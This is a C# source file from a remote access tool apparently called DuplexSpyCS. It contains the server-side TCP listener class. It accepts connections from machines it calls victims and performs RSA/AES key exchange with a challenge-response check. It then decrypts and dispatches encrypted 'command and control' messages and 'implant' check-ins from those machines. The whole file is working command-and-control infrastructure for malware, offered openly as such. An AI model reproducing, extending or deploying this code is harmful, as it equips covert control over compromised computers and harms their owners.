using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO.Compression;

namespace DuplexSpyCS
{
    public class clsTcpListener : clsListener
    {
        //Listener
        public Socket socket;

        int MAX_BUFFER_LENGTH = 65536; //BUFFER MAXIMUM LENGTH

        private List<clsVictim> m_lsVictim = new List<clsVictim>();
        public List<clsVictim> Victims { get { return m_lsVictim; } }

        //STATUS
        public int _received_bytes = 0;
        public int ReceivedBytes { get { return _received_bytes; } }
        public int _sent_bytes = 0;
        public int SentBytes { get { return _sent_bytes; } }

        //LOGS
        private clsSqlConn sql_conn;

        //Ini
        private clsIniManager ini_manager = clsStore.ini_manager;

        //CONSTRUCTOR
        public clsTcpListener(string szName, int nPort, string szDescription)
        {
            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;

            sql_conn = clsStore.sql_conn;
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            m_protocol = enListenerProtocol.TCP;

            m_bIslistening = false;
        }

        ~clsTcpListener() => fnStop();

        //Crypto
        private string GetChallengeText()
        {
            string text = null;

            try
            {
                bool bRandom = ini_manager.Read("Crypto", "bRandom") == "1";
                if (bRandom)
                {
                    const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                    int length = int.Parse(ini_manager.Read("Crypto", "length"));
                    Random rand = new Random();
                    char[] results = new char[length];

                    for (int i = 0; i < length; i++)
                        results[i] = chars[rand.Next(chars.Length)];

                    text = new string(results);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "GetChallengeText()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            if (string.IsNullOrEmpty(text))
            {
                MessageBox.Show("Challenge text is null or empty, the server will use \"HelloWorld\" automatically.", "string.IsNullOrEmpty()", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                text = "HelloWorld";
            }

            return text;
        }

        private byte[] CombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
        {
            byte[] bytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(first_bytes, first_idx, first_len);
                ms.Write(second_bytes, second_idx, second_len);
                bytes = ms.ToArray();
            }

            return bytes;
        }

        //START LISTEN
        public override void fnStart()
        {
            if (m_bIslistening)
            {
                //todo: msgbox
                return;
            }

            var hSafe = socket.SafeHandle;
            if (socket == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            socket.SendTimeout = -1; //NEVER TIMEOUT
            socket.ReceiveTimeout = -1; //NEVER TIMEOUT
            socket.Bind(new IPEndPoint(IPAddress.Any, m_nPort));

            socket.Listen(10000);
            socket.BeginAccept(new AsyncCallback(AcceptCallBack), socket);

            m_bIslistening = true;
        }

        //STOP LISTEN
        public override void fnStop()
        {
            if (m_nPort == -1)
            {
                MessageBox.Show("Server has not listened any specified port.", "Not listening", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }

            if (socket != null)
            {
                socket.Close();
            }

            sql_conn.NewLogs(clsSqlConn.CSV.Server, clsSqlConn.MsgType.System, $"Stop listening port: {m_nPort}");

            foreach (var victim in m_lsVictim)
            {
                try
                {
                    if (victim.socket != null && victim.socket.Connected)
                        victim.socket.Close();
                }
                catch (Exception ex)
                {
                    clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
                }
            }

            m_lsVictim.Clear();

            m_bIslistening = false;
        }

        /// <summary>
        /// Accept new callback socket.
        /// </summary>
        /// <param name="ar"></param>
        private void AcceptCallBack(IAsyncResult ar)
        {
            if (ar?.AsyncState == null)
                return;

            Socket handler = (Socket)ar.AsyncState;
            try
            {
                Socket client = handler.EndAccept(ar);
                handler.BeginAccept(new AsyncCallback(AcceptCallBack), handler);
                if (m_lsVictim.Select(x => x.socket.RemoteEndPoint.ToString().Split(':')[0]).ToArray().Contains(client.RemoteEndPoint.ToString().Split(':')[0]))
                {
                    client.Disconnect(true);
                    return;
                }
                clsVictim v = new clsVictim(this, client);
                v.ID = client.RemoteEndPoint.ToString();
                client.BeginReceive(v.buffer, 0, MAX_BUFFER_LENGTH, SocketFlags.None, new AsyncCallback(ReadCallBack), v);
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message, "AcceptCallback()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                sql_conn.WriteSysErrorLogs("AcceptcCallback()", ex.Message);
            }
        }

        /// <summary>
        /// Process all data from victim.
        /// </summary>
        /// <param name="ar"></param>
        private void ReadCallBack(IAsyncResult ar)
        {
            if (ar?.AsyncState == null)
                return;

            clsVictim v = (clsVictim)ar.AsyncState;
            if (v == null)
                return;

            m_lsVictim.Add(v);
            sql_conn.WriteSystemLogs($"New client is accepted: {v.socket.RemoteEndPoint.ToString()}");
            try
            {
                Socket socket = v.socket;
                clsDSP dsp = null;
                int receive_len = 0;
                byte[] static_receiveBuffer = new byte[MAX_BUFFER_LENGTH];
                byte[] dynamic_receiveBuffer = new byte[] { };
                string[] key_pairs = clsCrypto.CreateRSAKey(); //Create RSA key pair.
                v.key_pairs = (key_pairs[0], key_pairs[1]);
                string b64_PublicKey = clsCrypto.b64E2Str(v.key_pairs.public_key);
                v.Send(1, 0, b64_PublicKey); //PARAM: 1 -> RSA PUBLIC KEY
                sql_conn.WriteKeyExchange(v, "Sent RSA public key");
                do
                {
                    static_receiveBuffer = new byte[MAX_BUFFER_LENGTH];
                    receive_len = v.socket.Receive(static_receiveBuffer);
                    clsStore.recv_bytes += receive_len;
                    dynamic_receiveBuffer = CombineBytes(
                        dynamic_receiveBuffer,
                        0,
                        dynamic_receiveBuffer.Length,
                        static_receiveBuffer,
                        0,
                        receive_len
                    );
                    if (receive_len <= 0)
                        break;
                    else if (dynamic_receiveBuffer.Length < clsDSP.HEADER_SIZE)
                        continue;
                    else
                    {
                        var head_info = clsDSP.GetHeader(dynamic_receiveBuffer);
                        while (dynamic_receiveBuffer.Length - clsDSP.HEADER_SIZE >= head_info.len)
                        {
                            //dynamic_receiveBuffer = Decompress(dynamic_receiveBuffer);
                            dsp = new clsDSP(dynamic_receiveBuffer);
                            dynamic_receiveBuffer = dsp.MoreData;
                            head_info = clsDSP.GetHeader(dynamic_receiveBuffer);

                            if (dsp.Command == 0) //CONNECTION
                            {
                                if (dsp.Param == 0) //DISCONNECT
                                {

                                }
                                else if (dsp.Param == 1) //RECONNECT (REFRESH KEY)
                                {

                                }
                            }
                            else if (dsp.Command == 1) //KEY EXCHANGE
                            {
                                if (dsp.Param == 1) //ENCRYPT AES KEY AND IV -> CHALLENGE AND RESPONSE
                                {
                                    byte[] enc_aesData = dsp.GetMsg().msg;
                                    
                                    string enc_data = Encoding.UTF8.GetString(clsCrypto.RSADecrypt(enc_aesData, v.key_pairs.private_key));
                                    string[] s = enc_data.Split('|');
                                    
                                    string key = s[0];
                                    string iv = s[1];

                                    v._AES.key = Convert.FromBase64String(key);
                                    v._AES.iv = Convert.FromBase64String(iv);
                                    string challenge = GetChallengeText();
                                    v.challenge_text = challenge;
                                    string cipher_text = clsCrypto.AESEncrypt(challenge, v._AES.key, v._AES.iv);
                                    byte[] buffer = Encoding.UTF8.GetBytes(cipher_text);
                                    v.Send(1, 2, buffer);

                                    sql_conn.WriteKeyExchange(v, "Sent encrypted challenge");
                                }
                                else if (dsp.Param == 3) //CHALLENGE AND RESPONSE
                                {
                                    byte[] enc_aesData = dsp.GetMsg().msg;
                                    string enc_data = clsCrypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(enc_aesData)), v._AES.key, v._AES.iv);
                                    string payload = Encoding.UTF8.GetString(clsCrypto.RSADecrypt(Convert.FromBase64String(enc_data), v.key_pairs.private_key));
                                    if (payload == v.challenge_text)
                                    {
                                        v.encSend(1, 4, "1");
                                        DateTime datetime = DateTime.Now;
                                        v.last_sent = datetime;
                                        v.encSend(2, 1, datetime.ToString("F"));
                                        sql_conn.WriteKeyExchange(v, "OK");
                                    }
                                }
                                else if (dsp.Param == 4) //RESET AES KEY
                                {

                                }
                            }
                            else if (dsp.Command == 2) //COMMAND AND CONTROL
                            {
                                if (dsp.Param == 0)
                                {
                                    var buffer = dsp.GetMsg();

                                    string dec_data = clsCrypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(buffer.msg)), v._AES.key, v._AES.iv);
                                    string[] cmd = dec_data.Split("|");

                                    try
                                    {
                                        fnReceivedDecoded(this, v, cmd.ToList());
                                    }
                                    catch (InvalidOperationException)
                                    {

                                    }
                                }
                                else if (dsp.Param == 1)
                                {
                                    Task.Run(() =>
                                    {
                                        DateTime datetime = DateTime.Now;

                                        int nDelay = 5000;
                                        Thread.Sleep(nDelay);

                                        TimeSpan span = datetime - v.last_sent;
                                        v.latency_time = span.Milliseconds;
                                        v.last_sent = datetime;

                                        v.encSend(2, 1, clsEZData.fnGenerateRandomStr());
                                    });
                                }
                            }
                            else if (dsp.Command == 3) //Implant
                            {
                                byte[] abEncData = dsp.GetMsg().msg;
                                string szDecData = clsCrypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(abEncData)), v._AES.key, v._AES.iv);
                                string[] aszMsg = szDecData.Split("|");

                                fnImplantConnected(this, v, aszMsg.ToList());
                            }
                        }
                    }
                } 
                while (receive_len > 0 && m_bIslistening);
            }
            catch (Exception ex) //ERROR -> DISCONNECT
            {
                //MessageBox.Show(ex.Message);
                clsStore.sql_conn.WriteErrorLogs(v, ex.Message);
            }
            finally
            {
                fnDisconnected(v);
                m_lsVictim.Remove(v);
            }
        }
    }
}